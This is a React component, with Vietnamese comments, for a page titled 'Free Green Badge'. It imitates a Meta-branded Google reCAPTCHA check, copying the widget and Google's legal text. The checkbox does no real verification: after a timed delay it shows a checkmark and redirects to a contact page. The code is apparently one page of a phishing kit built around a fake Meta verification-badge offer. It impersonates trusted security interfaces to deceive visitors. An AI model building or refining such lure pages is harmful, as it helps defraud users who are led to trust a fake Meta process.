import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "./Live.scss";

// Sử dụng ảnh từ thư mục public (giống như bạn đã khai báo trước đó)
const META_IMAGE = "/meta-image.png";
const RECAPTCHA_IMAGE = "/recaptcha.png";
const CHECKMARK_IMAGE = "/checkmark.png"; // Hoặc "/imgi_3_shild.eca4fb565452b837de2f.png" nếu bạn có ảnh checkmark riêng

export default function Live() {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const [isShowCheckMark, setIsShowCheckMark] = useState(false);

  const handleVerify = () => {
    setIsLoading(true);
    // Giả lập API verify
    setTimeout(() => {
      setIsShowCheckMark(true);
      setIsLoading(false);
    }, 2000);
  };

  useEffect(() => {
    if (isShowCheckMark) {
      const redirectTimeout = setTimeout(() => {
        const currentTime = Date.now();
        navigate(`/contact/${currentTime}`);
      }, 500);
      return () => clearTimeout(redirectTimeout);
    }
  }, [isShowCheckMark, navigate]);

  return (
    <div className="live-container">
      <title>Free Green Badge</title>
      <div className="live-box">
        <img src={META_IMAGE} alt="Meta" className="live-meta" />
        
        <div className="checkbox-row">
          <div className="checkbox-wrapper">
            <div className="checkbox-left">
              <div className="checkbox-btn-container">
                <button
                  className="checkbox-button"
                  onClick={handleVerify}
                >
                  <input type="checkbox" className="hidden-checkbox" />
                  {isLoading ? (
                    <div className="spinner"></div>
                  ) : (
                    <div
                      className={`checkbox-square ${!isShowCheckMark ? 'not-checked' : 'checked'}`}
                      style={{
                        // Bạn cần có 1 file ảnh checkmark sprite giống project kia, 
                        // tạm thời tôi dùng background color/image đơn giản cho class 'checked'
                        // backgroundImage: isShowCheckMark ? `url("${CHECKMARK_IMAGE}")` : '',
                        // backgroundPosition: '-10px -595px'
                      }}
                    >
                        {/* Hiện ký hiệu check tạm nếu không có ảnh sprite */}
                        {isShowCheckMark && <span className="temp-check">✓</span>}
                    </div>
                  )}
                </button>
              </div>
              <div className="checkbox-label">I'm not a robot</div>
            </div>

            <div className="recaptcha-block">
              <img src={RECAPTCHA_IMAGE} alt="reCAPTCHA" className="recaptcha-img" />
              <p className="recaptcha-text">reCAPTCHA</p>
              <small className="recaptcha-small">Privacy - Terms</small>
            </div>
          </div>
        </div>

        <div className="live-text">
          <p>
            This helps us to combat harmful conduct, detect and prevent spam and
            maintain the integrity of our Products.
          </p>
          <p>
            We’ve used Google's reCAPTCHA Enterprise product to provide this
            security check. Your use of reCAPTCHA Enterprise is subject to
            Google’s Privacy Policy and Terms of Use.
          </p>
          <p>
            reCAPTCHA Enterprise collects hardware and software information,
            such as device and application data, and sends it to Google to
            provide, maintain, and improve reCAPTCHA Enterprise and for general
            security purposes. This information is not used by Google for
            personalized advertising.
          </p>
        </div>
      </div>
    </div>
  );
}
